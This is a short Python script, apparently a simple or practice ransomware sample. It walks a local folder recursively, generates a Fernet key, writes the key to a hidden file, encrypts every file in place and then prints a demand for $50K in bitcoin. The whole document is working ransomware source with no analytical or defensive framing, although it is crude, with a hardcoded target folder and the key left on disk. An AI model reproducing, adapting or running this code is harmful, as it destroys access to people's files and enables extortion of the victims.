#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

folder = "./computer"


def file_picker(folder):
    files = []

    for file in os.listdir(folder):
        file_path = os.path.join(folder, file)

        if os.path.isfile(file_path):
            files.append(file_path)

        elif os.path.isdir(file_path):
            files.extend(file_picker(file_path))

    return files


print("retrieving files...")
files = file_picker(folder)

print("generating key...")
key = Fernet.generate_key()

print("hiding key...")
with open(".hiddenkey.key", "wb") as fout:
    fout.write(key)

print("encrypting files...")
for file in files:
    with open(file, "rb") as fin:
        content = fin.read()

    encrypted_content = Fernet(key).encrypt(content)  # returns bytestring

    with open(file, "wb") as fout:
        fout.write(encrypted_content)

print("files locked, send $50K in bitcoin to NoobGrinder420!!")
